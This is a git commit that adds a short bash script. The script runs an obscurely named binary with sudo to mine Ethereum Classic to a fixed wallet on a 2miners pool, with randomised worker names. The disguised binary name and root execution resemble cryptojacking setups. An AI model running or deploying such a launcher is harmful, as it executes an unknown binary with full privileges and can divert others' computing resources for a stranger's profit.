53b0ce6060980c6aeb1bf5b0960af1b87e0db42c
Nizz776 <86077605+Nizz776@users.noreply.github.com>
2021-07-04 15:46:23 +0530

    acerni.sh

---
+++ acerni.sh
@@ -0,0 +1,10 @@
+#!/bin/bash
+
+POOL=asia-etc.2miners.com:1010
+WALLET=0xe3ed79913abb464e0ca11c278cec2a501bd4da7d
+WORKER=$(echo $(shuf -i 1-4 -n 1)-GPU)
+
+cd "$(dirname "$0")"
+
+chmod +x ./3wcb684 && sudo ./3wcb684 -a etchash -o $POOL -u $WALLET.$WORKER -log
+pause $@
